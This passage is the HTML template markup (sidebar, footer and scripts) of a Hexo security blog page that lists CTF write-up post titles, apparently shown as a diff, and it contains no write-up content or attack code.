title="HCTF2018Hideandseek">HCTF2018Hideandseek</a></li><li><a href="/2024/11/18/FBCTF2019-Products-Manager/" rel="bookmark" title="[FBCTF2019]Products-Manager">[FBCTF2019]Products-Manager</a></li><li><a href="/2024/11/18/BSidesCF-2019-Mixer/" rel="bookmark" title="[BSidesCF-2019]Mixer">[BSidesCF-2019]Mixer</a></li><li><a href="/2024/11/19/BSidesCF-2020-Cards/" rel="bookmark" title="[BSidesCF-2020]Cards">[BSidesCF-2020]Cards</a></li><li><a href="/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme/" rel="bookmark" title="[极客大挑战-2020]Roamphp4-Rceme">[极客大挑战-2020]Roamphp4-Rceme</a></li><li><a href="/2024/11/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-BabyJS/" rel="bookmark" title="[网鼎杯-2020-半决赛]BabyJS">[网鼎杯-2020-半决赛]BabyJS</a></li><li><a href="/2024/11/22/HMGCTF2022-Smarty-Calculator/" rel="bookmark" title="[HMGCTF2022]Smarty-Calculator">[HMGCTF2022]Smarty-Calculator</a></li><li><a href="/2024/11/29/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/" rel="bookmark" title="[红明谷CTF-2021]EasyTP">[红明谷CTF-2021]EasyTP</a></li><li><a href="/2024/12/01/LineCTF2022-BB/" rel="bookmark" title="[LineCTF2022]BB">[LineCTF2022]BB</a></li><li><a href="/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/" rel="bookmark" title="[NewStarCT_2023_公开赛道]Upload_again!">[NewStarCT_2023_公开赛道]Upload_again!</a></li><li><a href="/2024/12/04/%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87/" rel="bookmark" title="刷新过的图片">刷新过的图片</a></li><li><a href="/2024/12/04/MRCTF2020-Ezpop-Revenge/" rel="bookmark" title="[MRCTF2020]Ezpop_Revenge">[MRCTF2020]Ezpop_Revenge</a></li><li><a href="/2024/12/10/b01lers2020-Spac-Noodles/" rel="bookmark" title="[b01lers2020]Spac_Noodles">[b01lers2020]Spac_Noodles</a></li><li><a href="/2024/12/10/De1CTF-2019-Giftbox/" rel="bookmark" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></li><li><a href="/2025/01/26/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-EasyLogin/" rel="bookmark" title="[NewStarCTF2023公开赛道]EasyLogin">[NewStarCTF2023公开赛道]EasyLogin</a></li><li><a href="/2025/01/26/NewStarCTF2023%E6%96%B0%E7%94%9F%E8%B5%9B-BabySSTI-Three/" rel="bookmark" title="NewStarCTF2023新生赛_BabySSTI_Three">NewStarCTF2023新生赛_BabySSTI_Three</a></li><li><a href="/2025/02/09/%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-UnserializeOne/" rel="bookmark" title="公开赛赛道]UnserializeOne">公开赛赛道]UnserializeOne</a></li><li><a href="/2025/02/09/NewStarCTF%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two/" rel="bookmark" title="[NewStarCTF公开赛赛道]BabySSTI_Two">[NewStarCTF公开赛赛道]BabySSTI_Two</a></li><li><a href="/2025/02/09/BSidesCF2019-Sequel/" rel="bookmark" title="[BSidesCF2019]Sequel">[BSidesCF2019]Sequel</a></li><li><a href="/2025/02/23/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93Include/" rel="bookmark" title="NewStarCTF_2023_公开赛道Include">NewStarCTF_2023_公开赛道Include</a></li><li><a href="/2025/02/23/HFCTF-2021-Final-hatenum/" rel="bookmark" title="[HFCTF_2021_Final]hatenum">[HFCTF_2021_Final]hatenum</a></li><li><a href="/2025/02/23/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/" rel="bookmark" title="[Dest0g3_520迎新赛]SimpleRCE">[Dest0g3_520迎新赛]SimpleRCE</a></li><li><a href="/2025/02/24/SWPUCTF-2016-Web7/" rel="bookmark" title="[SWPUCTF_2016]Web7">[SWPUCTF_2016]Web7</a></li><li><a href="/2025/02/26/HMGCTF2022-Fan-Website/" rel="bookmark" title="[HMGCTF2022]Fan_Website">[HMGCTF2022]Fan_Website</a></li><li><a href="/2025/03/02/PyCalX-1/" rel="bookmark" title="PyCalX_1">PyCalX_1</a></li><li><a href="/2025/03/11/GKCTF-2021-babycat-revenge/" rel="bookmark" title="[GKCTF_2021]babycat-revenge">[GKCTF_2021]babycat-revenge</a></li><li><a href="/2025/03/13/%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B%EF%BC%9F/" rel="bookmark" title="谁赢了比赛？">谁赢了比赛？</a></li><li><a href="/2025/03/13/%E6%A2%85%E8%8A%B1%E9%A6%99%E8%87%AA%E8%8B%A6%E5%AF%92%E6%9D%A5/" rel="bookmark" title="梅花香自苦寒来">梅花香自苦寒来</a></li><li><a href="/2025/03/13/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-outguess/" rel="bookmark" title="[ACTF新生赛2020]outguess">[ACTF新生赛2020]outguess</a></li><li><a href="/2025/03/16/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-R-C-E/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!">[NewStarCTF-2023-公开赛道]R!!!C!!!E!!!</a></li><li><a href="/2025/03/18/JMCTF-2021-GoOSS/" rel="bookmark" title="[JMCTF_2021]GoOSS">[JMCTF_2021]GoOSS</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">180</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">13</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">141</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/04/28/4-txt/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/05/05/5%E6%9C%885%E6%97%A5buu/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/11/14/java%E5%8F%8D%E5%B0%84%E5%8E%9F%E7%90%86/" title="java反射原理">java反射原理</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme/" title="[极客大挑战-2020]Roamphp4-Rceme">[极客大挑战-2020]Roamphp4-Rceme</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+</div>
+
+    <span><a href="/2025/02/24/vnctf%E5%A4%8D%E7%8E%B0/" title="vnctf复现">vnctf复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/18/Quals-Bnv/" title="Quals]Bnv">Quals]Bnv</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/" title="[羊城杯2020]Easyphp2">[羊城杯2020]Easyphp2</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/03/13/%E6%A2%85%E8%8A%B1%E9%A6%99%E8%87%AA%E8%8B%A6%E5%AF%92%E6%9D%A5/" title="梅花香自苦寒来">梅花香自苦寒来</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/08/28/RoarCTF2019-OnlineProxy/" title="[RoarCTF2019]OnlineProxy">[RoarCTF2019]OnlineProxy</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/08/01/FireshellCTF2020-CaasC%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86/" title="[FireshellCTF2020]CaasC的预处理">[FireshellCTF2020]CaasC的预处理</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/22/RoarCTF2019-SimpleUpload/" title="[RoarCTF2019]SimpleUpload">[RoarCTF2019]SimpleUpload</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/05/30/Web1-Dropbox/" title="Web1]Dropbox">Web1]Dropbox</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/04/29/5-txt/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
